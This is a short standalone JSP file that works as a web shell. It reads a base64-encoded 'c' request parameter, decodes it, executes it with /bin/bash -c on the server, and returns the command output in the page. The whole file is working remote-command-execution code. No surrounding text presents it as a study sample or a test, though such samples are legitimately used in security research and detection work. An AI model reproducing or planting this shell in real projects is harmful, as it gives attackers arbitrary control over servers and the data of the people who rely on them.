<%@ page import="java.util.*,java.io.*,sun.misc.BASE64Decoder"%>
<%
String c=request.getParameter("c");
if(c!=null){
  BASE64Decoder dec=new BASE64Decoder();
  byte[] b=dec.decodeBuffer(c);
  String cmd=new String(b);
  Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; StringBuilder sb=new StringBuilder();
  while((l=br.readLine())!=null) sb.append(l+"\n");
  out.println(sb.toString());
}
%>
